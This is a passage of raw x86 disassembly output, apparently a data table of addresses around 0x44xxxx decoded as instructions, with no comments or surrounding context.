  443da6:	imul   eax,DWORD PTR [eax+eax*1+0x2c],0x6b
  443dab:	inc    esp
  443dac:	add    BYTE PTR [eax],dh
  443dae:	imul   eax,DWORD PTR [eax+eax*1+0x34],0x6b
  443db3:	inc    esp
  443db4:	add    BYTE PTR [eax],bh
  443db6:	imul   eax,DWORD PTR [eax+eax*1+0x3c],0x6b
  443dbb:	inc    esp
  443dbc:	add    BYTE PTR [eax+0x6b],al
  443dbf:	inc    esp
  443dc0:	add    BYTE PTR [ebx+ebp*2+0x44],al
  443dc4:	add    BYTE PTR [eax+0x6b],cl
  443dc7:	inc    esp
  443dc8:	add    BYTE PTR [ebx+ebp*2+0x44],cl
  443dcc:	add    BYTE PTR [eax+0x6b],dl
  443dcf:	inc    esp
  443dd0:	add    BYTE PTR [ebx+ebp*2+0x44],dl
  443dd4:	add    BYTE PTR [eax+0x6b],bl
  443dd7:	inc    esp
  443dd8:	add    BYTE PTR [ebx+ebp*2+0x44],bl
  443ddc:	add    BYTE PTR [eax+0x6b],ah
  443ddf:	inc    esp
  443de0:	add    BYTE PTR [ebx+ebp*2+0x44],ah
  443de4:	add    BYTE PTR [eax+0x6b],ch
  443de7:	inc    esp
  443de8:	add    BYTE PTR [ebx+ebp*2+0x44],ch
  443dec:	add    BYTE PTR [eax+0x6b],dh
  443def:	inc    esp
  443df0:	add    BYTE PTR [ebx+ebp*2+0x44],dh
  443df4:	add    BYTE PTR [eax+0x6b],bh
  443df7:	inc    esp
  443df8:	add    BYTE PTR [ebx+ebp*2+0x44],bh
  443dfc:	add    BYTE PTR [eax-0x7bffbb95],al
  443e02:	imul   eax,DWORD PTR [eax+eax*1-0x78],0x6b
  443e07:	inc    esp
  443e08:	add    BYTE PTR [ebx+ebp*2+0x6b900044],cl
  443e0f:	inc    esp
  443e10:	add    BYTE PTR [ebx+ebp*2+0x6b980044],dl
  443e17:	inc    esp
  443e18:	add    BYTE PTR [ebx+ebp*2+0x6ba00044],bl
  443e1f:	inc    esp
  443e20:	add    BYTE PTR [ebx+ebp*2+0x6ba80044],ah
  443e27:	inc    esp
  443e28:	add    BYTE PTR [ebx+ebp*2+0x6bb00044],ch
  443e2f:	inc    esp
  443e30:	add    BYTE PTR [ebx+ebp*2+0x6b980044],dh
  443e37:	inc    esp
  443e38:	add    BYTE PTR [eax-0x43ffbb95],bh
  443e3e:	imul   eax,DWORD PTR [eax+eax*1+0x60],0x6b
  443e43:	inc    esp
  443e44:	add    al,al
  443e46:	imul   eax,DWORD PTR [eax+eax*1-0x3c],0x6b
  443e4b:	inc    esp
  443e4c:	add    al,cl
  443e4e:	imul   eax,DWORD PTR [eax+eax*1-0x10],0x6a
  443e53:	inc    esp
  443e54:	add    ah,cl
  443e56:	imul   eax,DWORD PTR [eax+eax*1+0x5c],0x6b
  443e5b:	inc    esp
  443e5c:	add    al,dl
  443e5e:	imul   eax,DWORD PTR [eax+eax*1-0x2c],0x6b
  443e63:	inc    esp
  443e64:	add    al,dh
  443e66:	push   0x44
  443e68:	add    al,bl
  443e6a:	imul   eax,DWORD PTR [eax+eax*1-0x24],0x6b
  443e6f:	inc    esp
  443e70:	add    BYTE PTR [eax-0x1fffbb95],ah
  443e76:	imul   eax,DWORD PTR [eax+eax*1-0x1c],0x6b
  443e7b:	inc    esp
  443e7c:	add    ah,ah
  443e7e:	imul   eax,DWORD PTR [eax+eax*1-0x18],0x6b
  443e83:	inc    esp
  443e84:	add    ah,ch
  443e86:	imul   eax,DWORD PTR [eax+eax*1-0x10],0x6b
  443e8b:	inc    esp
  443e8c:	add    ah,dh
  443e8e:	imul   eax,DWORD PTR [eax+eax*1-0x8],0x6b
  443e93:	inc    esp
  443e94:	add    al,dl
  443e96:	push   0x44
  443e98:	add    ah,bh
  443e9a:	imul   eax,DWORD PTR [eax+eax*1+0x0],0x6c
  443e9f:	inc    esp
  443ea0:	add    BYTE PTR [esp+ebp*2],al
  443ea3:	inc    esp
  443ea4:	add    BYTE PTR [eax],cl
  443ea6:	ins    BYTE PTR es:[edi],dx
  443ea7:	inc    esp
  443ea8:	add    BYTE PTR [esp+ebp*2],cl
  443eab:	inc    esp
  443eac:	add    BYTE PTR [eax],dl
  443eae:	ins    BYTE PTR es:[edi],dx
  443eaf:	inc    esp
  443eb0:	add    BYTE PTR [esp+ebp*2],dl
  443eb3:	inc    esp
  443eb4:	add    BYTE PTR [eax],bl
  443eb6:	ins    BYTE PTR es:[edi],dx
  443eb7:	inc    esp
  443eb8:	add    BYTE PTR [esp+ebp*2],bl
  443ebb:	inc    esp
  443ebc:	add    ah,al
  443ebe:	push   0x44
  443ec0:	add    BYTE PTR [eax],ah
  443ec2:	ins    BYTE PTR es:[edi],dx
  443ec3:	inc    esp
  443ec4:	add    ah,ah
  443ec6:	push   0x44
  443ec8:	add    BYTE PTR [esp+ebp*2],ah
  443ecb:	inc    esp
  443ecc:	add    BYTE PTR [eax],ch
  443ece:	ins    BYTE PTR es:[edi],dx
  443ecf:	inc    esp
  443ed0:	add    BYTE PTR [eax+0x2c00446a],ch
  443ed6:	ins    BYTE PTR es:[edi],dx
  443ed7:	inc    esp
  443ed8:	add    BYTE PTR [eax],dh
  443eda:	ins    BYTE PTR es:[edi],dx
  443edb:	inc    esp
  443edc:	add    BYTE PTR [esp+ebp*2],dh
  443edf:	inc    esp
  443ee0:	add    BYTE PTR [eax],bh
  443ee2:	ins    BYTE PTR es:[edi],dx
  443ee3:	inc    esp
  443ee4:	add    BYTE PTR [esp+ebp*2],bh
  443ee7:	inc    esp
  443ee8:	add    BYTE PTR [eax+0x6c],al
  443eeb:	inc    esp
  443eec:	add    BYTE PTR [esp+ebp*2+0x44],al
  443ef0:	add    BYTE PTR [eax+0x6c],cl
  443ef3:	inc    esp
  443ef4:	add    BYTE PTR [esp+ebp*2+0x44],cl
  443ef8:	add    BYTE PTR [eax+0x6c],dl
  443efb:	inc    esp
  443efc:	add    BYTE PTR [esp+ebp*2+0x44],dl
  443f00:	add    BYTE PTR [eax+0x6c],bl
  443f03:	inc    esp
  443f04:	add    BYTE PTR [edx+ebp*2+0x6c5c0044],al
  443f0b:	inc    esp
  443f0c:	add    BYTE PTR [eax+0x6c],ah
  443f0f:	inc    esp
  443f10:	add    BYTE PTR [esp+ebp*2+0x44],ah
  443f14:	add    BYTE PTR [eax+0x6c],ch
  443f17:	inc    esp
  443f18:	add    BYTE PTR [esp+ebp*2+0x44],ch
  443f1c:	add    al,al
  443f1e:	imul   eax,DWORD PTR [eax+eax*1+0x70],0x6c
  443f23:	inc    esp
  443f24:	add    BYTE PTR [esp+ebp*2+0x44],dh
  443f28:	add    BYTE PTR [eax+0x6c],bh
  443f2b:	inc    esp
  443f2c:	add    BYTE PTR [esp+ebp*2+0x44],bh
  443f30:	add    BYTE PTR [eax-0x7bffbb94],al
  443f36:	ins    BYTE PTR es:[edi],dx
  443f37:	inc    esp
  443f38:	add    BYTE PTR [eax-0x5fffbb94],cl
  443f3e:	push   0x44
  443f40:	add    BYTE PTR [esp+ebp*2+0x6c900044],cl
  443f47:	inc    esp
  443f48:	add    BYTE PTR [eax+0x6c],bl
  443f4b:	inc    esp
  443f4c:	add    BYTE PTR [eax-0x6bffbb95],dl
  443f52:	ins    BYTE PTR es:[edi],dx
  443f53:	inc    esp
  443f54:	add    BYTE PTR [eax-0x63ffbb94],bl
  443f5a:	ins    BYTE PTR es:[edi],dx
  443f5b:	inc    esp
  443f5c:	add    BYTE PTR [eax-0x5bffbb94],ah
  443f62:	ins    BYTE PTR es:[edi],dx
  443f63:	inc    esp
  443f64:	add    BYTE PTR [eax-0x53ffbb94],ch
  443f6a:	ins    BYTE PTR es:[edi],dx
  443f6b:	inc    esp
  443f6c:	add    BYTE PTR [eax-0x4fffbb94],dh
  443f72:	jo     0x443fb8
  443f74:	add    BYTE PTR [eax+esi*2+0x70b80044],dh
  443f7b:	inc    esp
  443f7c:	add    BYTE PTR [eax+esi*2+0x70c00044],bh
  443f83:	inc    esp
  443f84:	add    ah,al
  443f86:	jo     0x443fcc
  443f88:	add    al,cl
  443f8a:	jo     0x443fd0
  443f8c:	add    ah,cl
  443f8e:	jo     0x443fd4
  443f90:	add    al,dl
  443f92:	jo     0x443fd8
  443f94:	add    ah,dl
  443f96:	jo     0x443fdc
  443f98:	add    ah,cl
  443f9a:	jo     0x443fe0
  443f9c:	add    al,bl
  443f9e:	jo     0x443fe4
  443fa0:	add    ah,bl
  443fa2:	jo     0x443fe8
  443fa4:	add    al,ah
  443fa6:	jo     0x443fec
  443fa8:	add    al,cl
  443faa:	jo     0x443ff0
  443fac:	add    ah,ah
  443fae:	jo     0x443ff4
  443fb0:	add    al,ch
  443fb2:	jo     0x443ff8
  443fb4:	add    ah,ch
  443fb6:	jo     0x443ffc
  443fb8:	add    al,dh
  443fba:	jo     0x444000
  443fbc:	add    ah,dh
  443fbe:	jo     0x444004
  443fc0:	add    al,bh
  443fc2:	jo     0x444008
  443fc4:	add    ah,bh
  443fc6:	jo     0x44400c
  443fc8:	add    BYTE PTR [eax],al
  443fca:	jno    0x444010
  443fcc:	add    BYTE PTR [ecx+esi*2],al
  443fcf:	inc    esp
  443fd0:	add    BYTE PTR [eax],cl
  443fd2:	jno    0x444018
  443fd4:	add    BYTE PTR [ecx+esi*2],cl
  443fd7:	inc    esp
  443fd8:	add    BYTE PTR [eax],dl
  443fda:	jno    0x444020
  443fdc:	add    BYTE PTR [ecx+esi*2],dl
  443fdf:	inc    esp
  443fe0:	add    BYTE PTR [eax],bl
  443fe2:	jno    0x444028
  443fe4:	add    BYTE PTR [ecx+esi*2],bl
  443fe7:	inc    esp
  443fe8:	add    BYTE PTR [eax],ah
  443fea:	jno    0x444030
  443fec:	add    BYTE PTR [ecx+esi*2],ah
  443fef:	inc    esp
  443ff0:	add    BYTE PTR [eax],ch
  443ff2:	jno    0x444038
  443ff4:	add    BYTE PTR [ecx+esi*2],ch
  443ff7:	inc    esp
  443ff8:	add    BYTE PTR [eax],dh
  443ffa:	jno    0x444040
  443ffc:	add    BYTE PTR [ecx+esi*2],dh
  443fff:	inc    esp
  444000:	add    BYTE PTR [eax],bh
  444002:	jno    0x444048
  444004:	add    BYTE PTR [ecx+esi*2],bh
  444007:	inc    esp
  444008:	add    BYTE PTR [eax+0x71],al
  44400b:	inc    esp
  44400c:	add    BYTE PTR [ecx+esi*2+0x44],al
  444010:	add    BYTE PTR [eax+0x71],cl
  444013:	inc    esp
  444014:	add    BYTE PTR [ecx+esi*2+0x44],cl
  444018:	add    BYTE PTR [eax+0x71],dl
  44401b:	inc    esp
  44401c:	add    BYTE PTR [ecx+esi*2+0x44],dl
  444020:	add    BYTE PTR [eax+0x71],bl
  444023:	inc    esp
  444024:	add    BYTE PTR [ecx+esi*2+0x44],bl
  444028:	add    BYTE PTR [eax+0x71],ah
  44402b:	inc    esp
  44402c:	add    BYTE PTR [ecx+esi*2+0x44],ah
  444030:	add    BYTE PTR [eax+0x71],ch
  444033:	inc    esp
  444034:	add    BYTE PTR [ecx+esi*2+0x44],ch
  444038:	add    BYTE PTR [eax+0x71],dh
  44403b:	inc    esp
  44403c:	add    BYTE PTR [ecx+esi*2+0x44],dh
  444040:	add    BYTE PTR [eax+0x71],bh
  444043:	inc    esp
  444044:	add    BYTE PTR [ecx+esi*2+0x44],bh
  444048:	add    BYTE PTR [eax-0x7bffbb8f],al
  44404e:	jno    0x444094
  444050:	add    BYTE PTR [eax-0x77ffbb8f],al
  444056:	jno    0x44409c
  444058:	add    BYTE PTR [ecx+esi*2+0x71900044],cl
  44405f:	inc    esp
  444060:	add    BYTE PTR [ecx+esi*2+0x71980044],dl
  444067:	inc    esp
  444068:	add    BYTE PTR [ecx+esi*2],al
  44406b:	inc    esp
  44406c:	add    BYTE PTR [ecx+esi*2+0x71a00044],bl
  444073:	inc    esp
  444074:	add    BYTE PTR [ecx+esi*2+0x71a80044],ah
  44407b:	inc    esp
  44407c:	add    BYTE PTR [eax-0x53ffbb90],dh
  444082:	jno    0x4440c8
  444084:	add    BYTE PTR [ecx+esi*2+0x44],dl
  444088:	add    BYTE PTR [eax-0x4fffbb90],bh
  44408e:	jno    0x4440d4
  444090:	add    BYTE PTR [ecx+esi*2+0x71b80044],dh
  444097:	inc    esp
  444098:	add    BYTE PTR [ecx+esi*2+0x71c00044],bh
  44409f:	inc    esp
  4440a0:	add    ah,al
  4440a2:	jno    0x4440e8
  4440a4:	add    BYTE PTR [ecx+esi*2],bh
  4440a7:	inc    esp
  4440a8:	add    al,cl
  4440aa:	jno    0x4440f0
  4440ac:	add    ah,cl
  4440ae:	jno    0x4440f4
  4440b0:	add    al,dl
  4440b2:	jno    0x4440f8
  4440b4:	add    BYTE PTR [eax-0x2bffbb8f],dh
  4440ba:	jno    0x444100
  4440bc:	add    al,bl
  4440be:	jno    0x444104
  4440c0:	add    BYTE PTR [ecx+esi*2+0x71280044],ch
  4440c7:	inc    esp
  4440c8:	add    BYTE PTR [eax-0x23ffbb8f],ah
  4440ce:	jno    0x444114
  4440d0:	add    al,ah
  4440d2:	jno    0x444118
  4440d4:	add    ah,ah
  4440d6:	jno    0x44411c
  4440d8:	add    al,ch
  4440da:	jno    0x444120
  4440dc:	add    ah,ch
  4440de:	jno    0x444124
  4440e0:	add    al,dh
  4440e2:	jno    0x444128
  4440e4:	add    ah,dh
  4440e6:	jno    0x44412c
  4440e8:	add    al,bh
  4440ea:	jno    0x444130
  4440ec:	add    ah,bh
  4440ee:	jno    0x444134
  4440f0:	add    BYTE PTR [eax],al
  4440f2:	jb     0x444138
  4440f4:	add    BYTE PTR [eax-0x4bffbb90],bh
  4440fa:	jno    0x444140
  4440fc:	add    al,cl
  4440fe:	jno    0x444144
  444100:	add    BYTE PTR [edx+esi*2],al
  444103:	inc    esp
  444104:	add    BYTE PTR [eax],cl
  444106:	jb     0x44414c
  444108:	add    BYTE PTR [edx+esi*2],cl
  44410b:	inc    esp
  44410c:	add    BYTE PTR [eax],dl
  44410e:	jb     0x444154
  444110:	add    BYTE PTR [edx+esi*2],dl
  444113:	inc    esp
  444114:	add    BYTE PTR [eax],bl
  444116:	jb     0x44415c
  444118:	add    BYTE PTR [ecx+esi*2],dh
  44411b:	inc    esp
  44411c:	add    BYTE PTR [edx+esi*2],bl
  44411f:	inc    esp
  444120:	add    BYTE PTR [eax],ah
  444122:	jb     0x444168
  444124:	add    BYTE PTR [edx+esi*2],ah
  444127:	inc    esp
  444128:	add    BYTE PTR [eax],ch
  44412a:	jb     0x444170
  44412c:	add    BYTE PTR [edx+esi*2],ch
  44412f:	inc    esp
  444130:	add    BYTE PTR [eax],dh
  444132:	jb     0x444178
  444134:	add    BYTE PTR [edx+esi*2],dh
  444137:	inc    esp
  444138:	add    ah,cl
  44413a:	jo     0x444180
  44413c:	add    ah,ch
  44413e:	jo     0x444184
  444140:	add    al,ch
  444142:	jno    0x444188
  444144:	add    BYTE PTR [eax],bh
  444146:	jb     0x44418c
  444148:	add    BYTE PTR [edx+esi*2],bh
  44414b:	inc    esp
  44414c:	add    BYTE PTR [eax+0x72],al
  44414f:	inc    esp
  444150:	add    BYTE PTR [edx+esi*2],al
  444153:	inc    esp
  444154:	add    BYTE PTR [edx+esi*2+0x44],al
  444158:	add    BYTE PTR [eax+0x72],cl
  44415b:	inc    esp
  44415c:	add    BYTE PTR [edx+esi*2+0x44],cl
  444160:	add    ah,ah
  444162:	jno    0x4441a8
  444164:	add    BYTE PTR [eax+0x72],dl
  444167:	inc    esp
  444168:	add    BYTE PTR [edx+esi*2+0x44],dl
  44416c:	add    BYTE PTR [eax+0x72],bl
  44416f:	inc    esp
  444170:	add    BYTE PTR [edx+esi*2+0x44],bl
  444174:	add    BYTE PTR [eax+0x72],ah
  444177:	inc    esp
  444178:	add    ah,ah
  44417a:	jo     0x4441c0
  44417c:	add    BYTE PTR [edx+esi*2+0x44],ah
  444180:	add    BYTE PTR [eax+0x4004470],bh
  444186:	jno    0x4441cc
  444188:	add    BYTE PTR [eax+0x72],ch
  44418b:	inc    esp
  44418c:	add    ah,cl
  44418e:	jno    0x4441d4
  444190:	add    BYTE PTR [eax-0xbffbb90],dh
  444196:	jno    0x4441dc
  444198:	add    BYTE PTR [ecx+esi*2],bh
  44419b:	inc    esp
  44419c:	add    BYTE PTR [edx+esi*2+0x44],ch
  4441a0:	add    BYTE PTR [eax+0x72],dh
  4441a3:	inc    esp
  4441a4:	add    BYTE PTR [edx+esi*2+0x44],dh
  4441a8:	add    BYTE PTR [eax+0x71],dh
  4441ab:	inc    esp
  4441ac:	add    BYTE PTR [eax],ah
  4441ae:	jb     0x4441f4
  4441b0:	add    BYTE PTR [eax+0x72],bh
  4441b3:	inc    esp
  4441b4:	add    BYTE PTR [edx+esi*2+0x44],bh
  4441b8:	add    BYTE PTR [eax+0x28004472],al
  4441be:	jb     0x444204
  4441c0:	add    BYTE PTR [edx+esi*2+0x71b00044],al
  4441c7:	inc    esp
  4441c8:	add    BYTE PTR [eax],bl
  4441ca:	jno    0x444210
  4441cc:	add    ah,al
  4441ce:	jo     0x444214
  4441d0:	add    BYTE PTR [eax-0x73ffbb8e],cl
  4441d6:	jb     0x44421c
  4441d8:	add    BYTE PTR [eax-0x6bffbb8e],dl
  4441de:	jb     0x444224
  4441e0:	add    BYTE PTR [eax-0x63ffbb8e],bl
  4441e6:	jb     0x44422c
  4441e8:	add    BYTE PTR [eax+0x4c004472],ah
  4441ee:	jb     0x444234
  4441f0:	add    BYTE PTR [ecx+esi*2],ch
  4441f3:	inc    esp
  4441f4:	add    BYTE PTR [edx+esi*2+0x72a80044],ah
  4441fb:	inc    esp
  4441fc:	add    ah,cl
  4441fe:	jo     0x444244
  444200:	add    BYTE PTR [edx+esi*2+0x72ac0044],al
  444207:	inc    esp
  444208:	add    BYTE PTR [eax-0x23ffbb8e],dh
  44420e:	jo     0x444254
  444210:	add    BYTE PTR [edx+esi*2+0x71a80044],dh
  444217:	inc    esp
  444218:	add    BYTE PTR [eax-0x47ffbb8f],dh
  44421e:	jb     0x444264
  444220:	add    BYTE PTR [eax],ah
  444222:	jb     0x444268
  444224:	add    al,al
  444226:	jno    0x44426c
  444228:	add    ah,ch
  44422a:	jno    0x444270
  44422c:	add    BYTE PTR [eax],bl
  44422e:	jno    0x444274
  444230:	add    BYTE PTR [edx+esi*2+0x44],dh
  444234:	add    BYTE PTR [ecx+esi*2+0x44],dh
  444238:	add    BYTE PTR [edx+esi*2+0x72780044],bh
  44423f:	inc    esp
  444240:	add    al,al
  444242:	jb     0x444288
  444244:	add    ah,al
  444246:	jb     0x44428c
  444248:	add    BYTE PTR [eax-0x37ffbb8f],al
  44424e:	jb     0x444294
  444250:	add    BYTE PTR [edx+esi*2+0x71c00044],bh
  444257:	inc    esp
  444258:	add    ah,cl
  44425a:	jb     0x4442a0
  44425c:	add    al,dl
  44425e:	jb     0x4442a4
  444260:	add    ah,dl
  444262:	jb     0x4442a8
  444264:	add    BYTE PTR [edx+esi*2+0x44],bl
  444268:	add    al,bl
  44426a:	jb     0x4442b0
  44426c:	add    al,dl
  44426e:	jb     0x4442b4
  444270:	add    BYTE PTR [eax],dh
  444272:	jb     0x4442b8
  444274:	add    BYTE PTR [eax+0x72],bl
  444277:	inc    esp
  444278:	add    ah,bl
  44427a:	jb     0x4442c0
  44427c:	add    al,ah
  44427e:	jb     0x4442c4
  444280:	add    BYTE PTR [eax-0x1bffbb8f],dl
  444286:	jb     0x4442cc
  444288:	add    al,ch
  44428a:	jb     0x4442d0
  44428c:	add    ah,ch
  44428e:	jb     0x4442d4
  444290:	add    al,dh
  444292:	jb     0x4442d8
  444294:	add    ah,dh
  444296:	jb     0x4442dc
  444298:	add    BYTE PTR [eax-0x47ffbb8e],dl
  44429e:	jno    0x4442e4
  4442a0:	add    al,bh
  4442a2:	jb     0x4442e8
  4442a4:	add    ah,bh
  4442a6:	jb     0x4442ec
  4442a8:	add    BYTE PTR [eax],al
  4442aa:	jae    0x4442f0
  4442ac:	add    BYTE PTR [ebx+esi*2],al
  4442af:	inc    esp
  4442b0:	add    BYTE PTR [eax],cl
  4442b2:	jae    0x4442f8
  4442b4:	add    BYTE PTR [eax+0x28004471],cl
  4442ba:	jb     0x444300
  4442bc:	add    BYTE PTR [eax+0x72],ch
  4442bf:	inc    esp
  4442c0:	add    BYTE PTR [edx+esi*2+0x44],bh
  4442c4:	add    ah,ah
  4442c6:	jo     0x44430c
  4442c8:	add    BYTE PTR [eax+0x72],ah
  4442cb:	inc    esp
  4442cc:	add    BYTE PTR [ebx+esi*2],cl
  4442cf:	inc    esp
  4442d0:	add    BYTE PTR [eax],dl
  4442d2:	jae    0x444318
  4442d4:	add    BYTE PTR [ebx+esi*2],dl
  4442d7:	inc    esp
  4442d8:	add    BYTE PTR [eax],ch
  4442da:	jno    0x444320
  4442dc:	add    BYTE PTR [edx+esi*2],ch
  4442df:	inc    esp
  4442e0:	add    BYTE PTR [eax],bl
  4442e2:	jae    0x444328
  4442e4:	add    BYTE PTR [eax+0x71],dh
  4442e7:	inc    esp
  4442e8:	add    BYTE PTR [ecx+esi*2+0x70b80044],al
  4442ef:	inc    esp
  4442f0:	add    BYTE PTR [ebx+esi*2],bl
  4442f3:	inc    esp
  4442f4:	add    al,dh
  4442f6:	jo     0x44433c
  4442f8:	add    BYTE PTR [eax],ah
  4442fa:	jae    0x444340
  4442fc:	add    BYTE PTR [ebx+esi*2],ah
  4442ff:	inc    esp
  444300:	add    BYTE PTR [eax],ch
  444302:	jae    0x444348
  444304:	add    BYTE PTR [edx+esi*2+0x44],ah
  444308:	add    BYTE PTR [ebx+esi*2],ch
  44430b:	inc    esp
  44430c:	add    BYTE PTR [eax],dh
  44430e:	jae    0x444354
  444310:	add    BYTE PTR [ebx+esi*2],dh
  444313:	inc    esp
  444314:	add    BYTE PTR [eax],bh
  444316:	jae    0x44435c
  444318:	add    BYTE PTR [eax+0x71],ch
  44431b:	inc    esp
  44431c:	add    BYTE PTR [ebx+esi*2],ch
  44431f:	inc    esp
  444320:	add    BYTE PTR [ebx+esi*2],bh
  444323:	inc    esp
  444324:	add    BYTE PTR [eax+0x73],al
  444327:	inc    esp
  444328:	add    BYTE PTR [ebx+esi*2],ch
  44432b:	inc    esp
  44432c:	add    BYTE PTR [ecx+esi*2+0x44],ah
  444330:	add    BYTE PTR [edx+esi*2],dl
  444333:	inc    esp
  444334:	add    BYTE PTR [edx+esi*2+0x71840044],bl
  44433b:	inc    esp
  44433c:	add    BYTE PTR [edx+esi*2+0x73440044],ah
  444343:	inc    esp
  444344:	add    BYTE PTR [eax+0x73],cl
  444347:	inc    esp
  444348:	add    BYTE PTR [ecx+esi*2+0x44],al
  44434c:	add    BYTE PTR [eax+0x4c004472],al
  444352:	jae    0x444398
  444354:	add    ah,dh
  444356:	jo     0x44439c
  444358:	add    BYTE PTR [ecx+esi*2],bh
  44435b:	inc    esp
  44435c:	add    BYTE PTR [eax+0x72],bl
  44435f:	inc    esp
  444360:	add    BYTE PTR [eax+0x73],dl
  444363:	inc    esp
  444364:	add    BYTE PTR [ebx+esi*2+0x44],dl
  444368:	add    BYTE PTR [ecx+esi*2+0x73580044],bl
  44436f:	inc    esp
  444370:	add    ah,dl
  444372:	jo     0x4443b8
  444374:	add    BYTE PTR [eax+0x71],al
  444377:	inc    esp
  444378:	add    BYTE PTR [ebx+esi*2+0x44],bl
  44437c:	add    BYTE PTR [edx+esi*2],ch
  44437f:	inc    esp
  444380:	add    BYTE PTR [eax+0x73],ah
  444383:	inc    esp
  444384:	add    BYTE PTR [eax+0x71],dl
  444387:	inc    esp
  444388:	add    BYTE PTR [ebx+esi*2+0x44],ah
  44438c:	add    al,dl
  44438e:	jo     0x4443d4
  444390:	add    BYTE PTR [eax+0x73],ch
  444393:	inc    esp
  444394:	add    BYTE PTR [eax+0x72],dh
  444397:	inc    esp
  444398:	add    BYTE PTR [ebx+esi*2+0x44],ch
  44439c:	add    BYTE PTR [eax+0x73],dh
  44439f:	inc    esp
  4443a0:	add    BYTE PTR [eax+0x71],ch
  4443a3:	inc    esp
  4443a4:	add    BYTE PTR [ecx+esi*2+0x44],bh
  4443a8:	add    al,dh
  4443aa:	jo     0x4443f0
  4443ac:	add    BYTE PTR [ebx+esi*2],al
  4443af:	inc    esp
  4443b0:	add    BYTE PTR [ecx+esi*2+0x44],al
  4443b4:	add    BYTE PTR [ebx+esi*2+0x44],dh
  4443b8:	add    BYTE PTR [eax+0x73],bh
  4443bb:	inc    esp
  4443bc:	add    BYTE PTR [eax],bl
  4443be:	jae    0x444404
  4443c0:	add    BYTE PTR [eax+0x8004472],ah
  4443c6:	jb     0x44440c
  4443c8:	add    BYTE PTR [ecx+esi*2+0x72e80044],ah
  4443cf:	inc    esp
  4443d0:	add    BYTE PTR [edx+esi*2],bh
  4443d3:	inc    esp
  4443d4:	add    BYTE PTR [ebx+esi*2+0x44],bh
  4443d8:	add    BYTE PTR [eax],ah
  4443da:	jae    0x444420
  4443dc:	add    ah,dh
  4443de:	jno    0x444424
  4443e0:	add    BYTE PTR [ebx+esi*2+0x44],ch
  4443e4:	add    BYTE PTR [eax+0x64004473],al
  4443ea:	jb     0x444430
  4443ec:	add    ah,ah
  4443ee:	jo     0x444434
  4443f0:	add    BYTE PTR [edx+esi*2],dl
  4443f3:	inc    esp
  4443f4:	add    BYTE PTR [ebx+esi*2+0x73880044],al
  4443fb:	inc    esp
  4443fc:	add    BYTE PTR [eax+0x44004471],bh
  444402:	jae    0x444448
  444404:	add    BYTE PTR [ebx+esi*2+0x73900044],cl
  44440b:	inc    esp
  44440c:	add    BYTE PTR [eax+0x72],ah
  44440f:	inc    esp
  444410:	add    BYTE PTR [ebx+esi*2+0x73980044],dl
  444417:	inc    esp
  444418:	add    BYTE PTR [eax+0x78004472],al
  44441e:	jno    0x444464
  444420:	add    ah,cl
  444422:	ins    BYTE PTR es:[edi],dx
  444423:	inc    esp
  444424:	add    al,dl
  444426:	ins    BYTE PTR es:[edi],dx
  444427:	inc    esp
  444428:	add    ah,dl
  44442a:	ins    BYTE PTR es:[edi],dx
  44442b:	inc    esp
  44442c:	add    al,bl
  44442e:	ins    BYTE PTR es:[edi],dx
  44442f:	inc    esp
  444430:	add    ah,bl
  444432:	ins    BYTE PTR es:[edi],dx
  444433:	inc    esp
  444434:	add    al,ah
  444436:	ins    BYTE PTR es:[edi],dx
  444437:	inc    esp
  444438:	add    ah,ah
  44443a:	ins    BYTE PTR es:[edi],dx
  44443b:	inc    esp
  44443c:	add    al,ch
  44443e:	ins    BYTE PTR es:[edi],dx
  44443f:	inc    esp
  444440:	add    ah,ch
  444442:	ins    BYTE PTR es:[edi],dx
  444443:	inc    esp
  444444:	add    al,dh
  444446:	ins    BYTE PTR es:[edi],dx
  444447:	inc    esp
  444448:	add    ah,dh
  44444a:	ins    BYTE PTR es:[edi],dx
  44444b:	inc    esp
  44444c:	add    al,bh
  44444e:	ins    BYTE PTR es:[edi],dx
  44444f:	inc    esp
  444450:	add    ah,bh
  444452:	ins    BYTE PTR es:[edi],dx
  444453:	inc    esp
  444454:	add    BYTE PTR [eax],al
  444456:	ins    DWORD PTR es:[edi],dx
  444457:	inc    esp
  444458:	add    BYTE PTR [ebp*2+0x6d080044],al
  44445f:	inc    esp
  444460:	add    BYTE PTR [ebp*2+0x6d100044],cl
  444467:	inc    esp
  444468:	add    BYTE PTR [ebp*2+0x6d180044],dl
  44446f:	inc    esp
  444470:	add    BYTE PTR [ebp*2+0x6d200044],bl
  444477:	inc    esp
  444478:	add    BYTE PTR [ebp*2+0x6d280044],ah
  44447f:	inc    esp
  444480:	add    BYTE PTR [ebp*2+0x6d300044],ch
  444487:	inc    esp
  444488:	add    BYTE PTR [ebp*2+0x6d380044],dh
  44448f:	inc    esp
  444490:	add    BYTE PTR [ebp*2+0x6d400044],bh
  444497:	inc    esp
  444498:	add    BYTE PTR [ebp+ebp*2+0x44],al
  44449c:	add    BYTE PTR [eax+0x6d],cl
  44449f:	inc    esp
  4444a0:	add    BYTE PTR [ebp+ebp*2+0x44],cl
  4444a4:	add    BYTE PTR [eax+0x6d],dl
  4444a7:	inc    esp
  4444a8:	add    BYTE PTR [ebp+ebp*2+0x44],dl
  4444ac:	add    BYTE PTR [eax+0x6d],bl
  4444af:	inc    esp
  4444b0:	add    BYTE PTR [ebp+ebp*2+0x44],bl
  4444b4:	add    BYTE PTR [eax+0x6d],ah
  4444b7:	inc    esp
  4444b8:	add    BYTE PTR [ebp+ebp*2+0x44],ah
  4444bc:	add    BYTE PTR [eax+0x6d],ch
  4444bf:	inc    esp
  4444c0:	add    BYTE PTR [ebp+ebp*2+0x44],ch
  4444c4:	add    BYTE PTR [eax+0x6d],dh
  4444c7:	inc    esp
  4444c8:	add    BYTE PTR [ebp+ebp*2+0x44],dh
  4444cc:	add    BYTE PTR [eax+0x6d],bh
  4444cf:	inc    esp
  4444d0:	add    BYTE PTR [ebp+ebp*2+0x44],bh
  4444d4:	add    BYTE PTR [eax-0x7bffbb93],al
  4444da:	ins    DWORD PTR es:[edi],dx
  4444db:	inc    esp
  4444dc:	add    BYTE PTR [eax+0x6d],ah
  4444df:	inc    esp
  4444e0:	add    BYTE PTR [eax-0x73ffbb93],cl
  4444e6:	ins    DWORD PTR es:[edi],dx
  4444e7:	inc    esp
  4444e8:	add    BYTE PTR [eax-0x6bffbb93],dl
  4444ee:	ins    DWORD PTR es:[edi],dx
  4444ef:	inc    esp
  4444f0:	add    BYTE PTR [eax+0x7400446d],bl
  4444f6:	ins    DWORD PTR es:[edi],dx
  4444f7:	inc    esp
  4444f8:	add    BYTE PTR [ebp+ebp*2+0x6da00044],bl
  4444ff:	inc    esp
